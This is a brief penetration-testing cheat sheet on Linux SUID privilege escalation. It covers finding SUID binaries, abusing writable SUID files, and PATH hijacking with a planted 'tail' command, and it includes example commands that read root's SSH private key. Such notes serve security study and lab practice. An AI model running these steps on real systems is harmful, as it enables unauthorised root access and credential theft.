SUID (Set User ID) means that:

- a file or program will be executed **with the permissions of its owner**
- NOT the permissions of the user running it

A SUID file looks like this:

> -rwsr-xr-x 1 root root 306456 Aug 17 06:41 /usr/bin/sudo

Note the `rws`.

This program runs as root, no matter who starts it.


## find SUID files

Find all the SUID executables:

````shell
find / -type f -perm -u=s 2>/dev/null
````

Filter-out OS stuff:

````shell
find / -type f -perm -u=s  2>/dev/null | grep -iv '/usr/bin/\|/usr/lib/'
````


## exploit via direct file editing

If the file is editable, the exploit is trivial:

- edit the file with your command (such as: `cat /root/.ssh/id_rsa`)
- run the program

Due to SUID, it will run with the privileges of the file owner.


## exploit via PATH hijacking

Inspect the SUID executable:

````shell
strings /usr/local/bin/target-file
````

Alternative: decompile it with [notes/ghidra.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/ghidra-decompile.md)


If it contains a command **without an absolute path** like this:

> ...  
> tail -f ...
> ...

We can:

1. write a malicious `tail` command
2. pass the `PATH=` to it

For example:

````shell
ls -la /root
cat /root/.ssh/id
````

````shell
PATH=/home/kali/ /usr/local/bin/target-file
````
